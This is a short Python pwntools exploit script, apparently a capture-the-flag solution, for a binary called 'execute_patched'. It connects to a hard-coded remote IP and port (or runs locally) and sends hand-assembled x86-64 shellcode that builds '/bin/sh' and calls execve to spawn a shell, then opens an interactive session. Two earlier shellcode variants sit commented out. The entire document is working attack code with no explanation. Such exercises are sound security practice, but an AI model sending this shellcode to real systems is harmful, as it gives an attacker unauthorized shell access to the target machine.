#!/usr/bin/env python3

from pwn import *

exe = ELF("./execute_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("178.128.29.224",9479)

    return r


def main():
    r = conn()
    # sleep(3)
    # payload = b"\x49\xc7\xc7\x00\x00\x00\x00\x41\x57\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x49\x81\xed\x33\x14\x00\x00\x49\x81\xc5\x08\x20\x00\x00\x41\xff\xe5"
    # payload = b"\x48\x31\xd2\x48\x31\xf6\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x49\x89\x07\x48\xc7\xc0\x3b\x00\x00\x00\x4c\x89\xff\x49\x81\xed\x33\x14\x00\x00\x49\x81\xc5\x08\x20\x00\x00\x41\xff\xe5"
    payload = b"\x48\x31\xd2\x48\x31\xf6\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x49\x89\x07\x4c\x89\xff\x49\x83\xc7\x08\x49\x81\xef\x48\xa0\x03\x00\x49\x81\xef\x00\x10\x23\x00\x49\x81\xc7\x70\x0d\x05\x00\x48\x83\xc4\x08\x41\xff\xd7"
    write("payload",payload)
    r.sendline(payload)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
